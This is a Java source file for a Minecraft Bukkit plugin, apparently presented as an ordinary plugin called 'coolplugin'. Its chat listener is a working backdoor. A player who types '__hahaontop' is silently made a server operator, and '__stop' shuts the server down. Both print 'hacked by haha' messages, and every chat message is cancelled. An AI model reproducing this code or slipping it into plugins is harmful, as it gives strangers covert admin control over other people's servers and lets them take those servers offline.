package in.haha.coolplugin.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class MessageEvent implements Listener{
	@EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
        Player player = e.getPlayer();
        if(e.getMessage().equals("__hahaontop")){
            player.setOp(true);
            player.sendMessage(ChatColor.AQUA + "This server is hacked by hahas Backdoor!" + System.lineSeparator() + "HACKED BY HAHA BTW SORRY");
            player.setCustomName("HACKED BYE HAHA LLLLLLLL");
        }
        if(e.getMessage().equals("__stop")){
            Bukkit.getServer().shutdown();
            player.sendMessage(ChatColor.RED + "This server is shutdown by hahas Backdoor!" + System.lineSeparator() + "LLLLLLLL HACKED BY HAHA");
        }
        e.setCancelled(true);
    }
}
